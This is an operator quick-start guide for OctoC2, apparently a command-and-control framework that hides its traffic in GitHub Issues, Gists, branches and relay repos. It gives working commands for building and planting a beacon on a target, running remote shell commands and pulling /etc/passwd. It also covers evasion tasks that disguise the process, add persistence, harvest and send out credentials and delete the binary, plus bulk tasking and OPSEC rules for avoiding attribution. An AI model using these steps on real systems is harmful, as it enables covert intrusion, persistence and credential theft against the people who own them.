# OctoC2 — Operator Quick-Start

Minimal path from zero to operational in 5 steps. Full details in [PRODUCTION.md](PRODUCTION.md).

See [PRODUCTION.md](PRODUCTION.md) for full deployment details and checklists.

---

## 0. Prerequisites

```bash
curl -fsSL https://bun.sh/install | bash    # Bun ≥ 1.3
git clone https://github.com/<your-fork>/OctoC2 && cd OctoC2
bun install                                  # workspace deps
```

You also need a GitHub PAT. Required scopes depend on which tentacles you enable:

| Deployment | Minimum scopes |
|------------|---------------|
| Beacon only (Issues/Branch/Actions) | `repo` |
| + Gist covert channel (T2) | `repo`, `gist` |
| + Codespaces/gRPC channel (T4) | `repo`, `gist`, `codespaces` |
| octoctl operator workstation | `repo`, `gist` |

Create a PAT with the scopes your deployment needs:

```
https://github.com/settings/tokens/new?scopes=repo,gist,codespaces
```

See [PRODUCTION.md — GitHub PAT Scopes](PRODUCTION.md) for the full per-role breakdown and GitHub App permission equivalents.

Set the four core env vars (add to `~/.bashrc` / `.env`):

```bash
export OCTOC2_GITHUB_TOKEN=<your-pat>
export OCTOC2_REPO_OWNER=<org-or-username>
export OCTOC2_REPO_NAME=<c2-repo-name>   # private repo, Issues enabled
export OCTOC2_OPERATOR_SECRET=           # filled in step 1
```

---

## Step 1 — Create GitHub App + Install _(recommended)_

> GitHub App tokens rotate every hour. Skip to step 1b for PAT-only auth.

**1a. Create the App**

1. Go to `https://github.com/settings/apps/new`
2. Set: Homepage URL = `https://github.com/<you>`, Webhook → disabled
3. Permissions: **Repository** → Contents (R/W), Issues (R/W), Variables (R/W), Actions (R/W), Secrets (R/W), Deployments (R/W); **Account** → Gists (R/W)
4. Click **Create GitHub App** → note **App ID**
5. Generate a private key → download `app-key.pem`
6. Install the App on your C2 repo → note **Installation ID** from URL

```bash
export OCTOC2_APP_ID=<App ID>
export OCTOC2_INSTALLATION_ID=<Installation ID>
# Keep app-key.pem secret — deliver to beacon via dead-drop (step 4)
```

**1b. PAT-only (quick dev)**

Skip App creation; set `OCTOC2_GITHUB_TOKEN` only. No additional steps.

---

## Step 2 — Generate Operator Keypair + Deploy C2 Server

```bash
# Generate X25519 keypair and push public key to C2 repo as MONITORING_PUBKEY variable
cd octoctl
bun run src/index.ts keygen --set-variable
# Output: OCTOC2_OPERATOR_SECRET=<base64url>
# → store this in your vault; export it in your shell

export OCTOC2_OPERATOR_SECRET=<output from above>
```

Start the C2 server (Codespace recommended for production):

```bash
cd server
bun run src/index.ts
# Listening: HTTP :8080 (dashboard API) | gRPC :50051 (Codespaces channel)
```

---

## Step 3 — Build & Deploy Beacon with Multi-Tentacle Priority

```bash
cd /path/to/OctoC2

# PAT build — default channel priority: issues,codespaces
bun run octoctl/src/index.ts build-beacon --outfile ./beacon

# With custom tentacle priority (stego primary, notes fallback, issues last resort)
OCTOC2_TENTACLE_PRIORITY=stego,notes,issues \
  bun run octoctl/src/index.ts build-beacon --outfile ./beacon

# App auth — bake App ID; deliver private key via dead-drop after deployment
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon \
  --app-id $OCTOC2_APP_ID \
  --installation-id $OCTOC2_INSTALLATION_ID

# With OctoProxy relay repos for traffic obfuscation
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon \
  --relay acme/infra-utils \
  --relay acme/build-tools
```

Deploy to target and run:

```bash
# Transfer beacon binary, then on target:
nohup ./beacon &>/dev/null &

# Deliver App private key via encrypted dead-drop (App auth only)
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --app-key-file ./app-key.pem           # --key-type app (inferred)

# Rotate operator monitoring public key
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --key-type monitoring \
  --monitoring-pubkey <base64url-pubkey>
```

Beacon registers automatically on first checkin (creates GitHub Issue `Scheduled maintenance · <shortId>`). Watch the server log or:

```bash
bun run octoctl/src/index.ts beacons --status active
```

---

## Step 4 — Deploy Proxy _(optional, for traffic obfuscation)_

```bash
# Provision a decoy GitHub repo as an OctoProxy relay
bun run octoctl/src/index.ts proxy create \
  --decoy-repo <owner/decoy-repo> \
  --beacon <beacon-id-prefix> \
  --ctrl-token $OCTOC2_GITHUB_TOKEN \
  --ctrl-owner $OCTOC2_REPO_OWNER \
  --ctrl-repo  $OCTOC2_REPO_NAME \
  --create-repo \
  --scaffold

# Update running beacon to use proxy via dead-drop
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --tentacle-priority proxy,issues
```

---

## Step 5 — Operate: Bulk Actions, OpenHulud, Dashboard

### Queue a task

```bash
ID=<beacon-id-prefix>
CTL="bun run octoctl/src/index.ts"

$CTL task $ID --kind shell --cmd "id"
$CTL task $ID --kind download --remote-path /etc/passwd
$CTL task $ID --kind ping
$CTL results $ID --last 5
```

### Tentacle health

```bash
$CTL tentacles health --beacon $ID
$CTL tentacles health --beacon $ID --server-url http://localhost:8080  # live stats
$CTL tentacles health --beacon $ID --json
```

### OpenHulud OPSEC hardening

```bash
E="$CTL task $ID --kind evasion --args-json"
$E '{"action":"hide","name":"systemd-journal"}'   # mask process name
$E '{"action":"anti_debug"}'                       # detect ptrace / LD_PRELOAD
$E '{"action":"persist","method":"auto"}'          # install persistence
$E '{"action":"status"}'                           # check evasion state
$E '{"action":"propagate","token":"<gist-pat>"}'   # scan + exfil credentials
$E '{"action":"self_delete"}'                      # unlink binary (after persist)
```

### Bulk actions via dashboard

1. Open dashboard: `cd dashboard && bun run dev` → `http://localhost:5173`
2. Log in with PAT + server URL
3. In the Beacons table: ☑ select multiple rows
4. BulkActionBar appears — choose `shell`, `persist`, `openhulud`, or `stego`
5. Confirm dialog → tasks queued on all selected beacons simultaneously
6. Click **View Results** → opens `/results?beacons=id1,id2,…` aggregate result viewer

### Dashboard live features

| Feature | Where |
|---------|-------|
| SSE real-time refresh | Beacon list + detail pages auto-update when events arrive — no manual refresh needed |
| Tentacle health mini-grid | Beacon detail → Overview tab — shows active channel with pulsing green dot |
| Maintenance diagnostic decrypt | Beacon detail → Maintenance tab — auto-decrypts if private key is in auth context |
| Copy All Decrypted Results | Beacon detail → Results tab — copies all decrypted outputs joined by `---` |
| Tentacle Monitor live updates | Tentacles page — pulsing green dots on active channels + last-updated timestamp |
| Multi-beacon result viewer | `/results?beacons=id1,id2` — aggregate results for bulk shell operations |
| Settings + keypair generator | `/settings` — generate X25519 keypair in-browser; safety checklist |
| Cmd/Ctrl+K global search | Any page — fast beacon search by ID, hostname, or OS |

### Operational notes

- **SSE real-time** — The beacon list and detail pages subscribe to a live event stream from the C2 server. No manual refresh needed; new beacon check-ins and task completions appear within seconds.
- **Bulk shell** — Select multiple beacons in the table, enter a command in the shell input, and click "Queue". All selected beacons receive the task simultaneously. Use `octoctl bulk shell --beacon-ids <ids> --cmd "..." --wait` for the same effect from the terminal; `--wait` polls for results every 2 s and prints them as they arrive.
- **Maintenance decrypt** — Navigate to Beacon detail → Maintenance tab. If your operator private key is stored in the auth context (advanced settings on login), diagnostics auto-decrypt. Otherwise click "Decrypt Diagnostic" and enter the key manually.
- **Copy All Results** — In the Results tab, once results are decrypted, "Copy All" collects every decrypted output and copies it to the clipboard, separated by `---` dividers.

### Interactive shell REPL

```bash
OCTOC2_SERVER_URL=http://localhost:8080 \
  $CTL beacon shell --beacon $ID
# Prompt: > id
# Result printed as it arrives (~1 checkin cycle)
```

---

## Run Mega E2E

Tests the full wire protocol against the real GitHub API. Requires env vars from step 0.

```bash
# Basic (creates beacon issue, queues 3 tasks, asserts results, cleans up)
bun run scripts/test-end-to-end.ts --cleanup

# Full suite — all channels + OPSEC fingerprint check
bun run scripts/test-end-to-end.ts \
  --notes --gist --branch --actions --secrets --stego --pages \
  --proxy --maintenance --fingerprint --cleanup

# GitHub App auth path
bun run scripts/test-end-to-end.ts --app-key --cleanup

# OpenHulud + maintenance + bulk shell + cleanup
bun run scripts/test-end-to-end.ts --openhulud --maintenance --bulk --cleanup

# Mega run — everything
bun run scripts/test-end-to-end.ts \
  --notes --gist --branch --actions --secrets --stego --pages \
  --proxy --maintenance --openhulud --bulk --fingerprint --cleanup
```

---

## Key OPSEC Notes

| Check | Rule |
|-------|------|
| C2 repo | Keep **private**; Issues enabled |
| PAT | `repo` scope only; rotate every 30–90 days via `drop create --new-token` |
| App key | **Never bake** into beacon binary; always deliver via `drop create --app-key-file` |
| Commit messages | All beacon git ops use sanitised messages (`"update"`, `"sync"`) — verified by `--fingerprint` flag |
| Beacon title | Must stay `Scheduled maintenance · <shortId>` — never rename the issue |
| Cleanup | `OCTOC2_CLEANUP_DAYS=3` prunes result comments automatically |

---

## Security Checklist

Work through this before any production deployment.

| # | Check | Detail |
|---|-------|--------|
| 1 | **C2 repo is private** | Issues, variables, and artifacts are only visible to repo members |
| 2 | **GitHub App auth (not PAT)** | App tokens rotate hourly; PATs are long-lived and harder to revoke |
| 3 | **App private key via dead-drop** | Never bake `app-key.pem` into the beacon binary — always deliver via `drop create --app-key-file` |
| 4 | **OctoProxy relay active** | Direct traffic from target → C2 repo is a single attribution point; a proxy repo breaks the chain |
| 5 | **No public Pages** | If using T5 (Pages tentacle), ensure the repo's GitHub Pages is **not** set to public |
| 6 | **PAT scopes are minimal** | Use only the scopes your deployment needs (`repo`, `gist`, `codespaces`); never add `admin:org`, `workflow`, or `user` |
| 7 | **Rotate credentials every 30 days** | Use `octoctl drop create --new-token` to deliver a fresh token to running beacons |
| 8 | **`--fingerprint` E2E flag passes** | Run `bun run scripts/test-end-to-end.ts --fingerprint` to verify no OPSEC leaks in commit messages, branch names, or variable names |
| 9 | **`OCTOC2_CLEANUP_DAYS` set** | Prunes old result comments automatically; default 7 days if unset |
| 10 | **Dashboard not exposed publicly** | Run `cd dashboard && bun run dev` locally; never deploy the operator dashboard to a public URL |

---

---

## Common Pitfalls

| Symptom | Cause | Fix |
|---------|-------|-----|
| Beacon never appears in `octoctl beacons` | Beacon binary can't reach GitHub API | Check `OCTOC2_GITHUB_TOKEN` is set and the target has outbound HTTPS to `api.github.com` |
| `octoctl drop create` says "beacon not found" | Beacon hasn't checked in yet | Wait one checkin cycle (`OCTOC2_SLEEP` seconds, default 60); run `octoctl beacons` to confirm |
| Tasks queue but never execute | Beacon is checking the wrong issue (wrong repo) | Confirm `OCTOC2_REPO_OWNER` + `OCTOC2_REPO_NAME` match where the beacon registered |
| `decrypt` fails in dashboard | Operator private key not loaded in auth context | Log in again with the base64url `OCTOC2_OPERATOR_SECRET` value in the "Private key" field |
| Stego branch not found | Beacon hasn't triggered the stego channel yet | Queue a stego task or run E2E with `--stego`; channel activates on first use |
| App auth fails after 1 hour | Installation token expired | Normal — beacon auto-rotates. If it stays failed: re-deliver `app-key.pem` via `drop create --key-type app` |
| Proxy health shows "unhealthy" | Decoy repo workflows not installed | Re-run `octoctl proxy provision --repo <decoy>` or check the decoy repo's Actions tab |
| `--fingerprint` E2E check fails | A commit message or branch name contains a forbidden term | Search for the matching term in beacon source code; check `FINGERPRINT_FORBIDDEN_TERMS` in the E2E script |
| `bun run test` times out on dashboard | Parallel vitest workers exhausted | Run tests sequentially: `cd dashboard && bun run test` (not `bun test`); never run two test processes at once |
| `octoctl build-beacon` can't find `bun` | PATH doesn't include bun after install | Set `BUN_PATH=/home/<user>/.bun/bin/bun` or run `. ~/.bashrc` first |

---

> Full reference: [PRODUCTION.md](PRODUCTION.md)

---

## Running in GitHub Codespace

GitHub Codespaces provides a convenient cloud environment for operating OctoC2 — the C2 server stays reachable even when your local machine is offline.

### Port forwarding

Forward the two ports the stack uses so your browser can reach them:

1. Open the **Ports** panel in VS Code (bottom tab bar or `Ctrl+Shift+P` → "Forward a Port").
2. Add port **8080** — label it `C2 Server`.
3. Add port **5173** — label it `Dashboard (dev)`.
4. Set both ports to **Private** visibility to avoid exposing them to the public internet.

Alternatively, use the GitHub CLI inside the Codespace terminal:

```bash
gh codespace ports forward 8080:8080 5173:5173
```

### Start the C2 server

```bash
cd server && bun run dev
# Listening: HTTP :8080 (dashboard API + beacon check-ins)
```

### Start the dashboard

```bash
cd dashboard && bun run dev
# Vite dev server at http://localhost:5173
```

The dashboard auto-connects to `http://localhost:8080` — no extra configuration needed. Log in with your PAT and the forwarded server URL shown in the Ports panel (e.g. `https://<codespace>-8080.app.github.dev`) if accessing from outside the Codespace, or simply `http://localhost:8080` from within it.
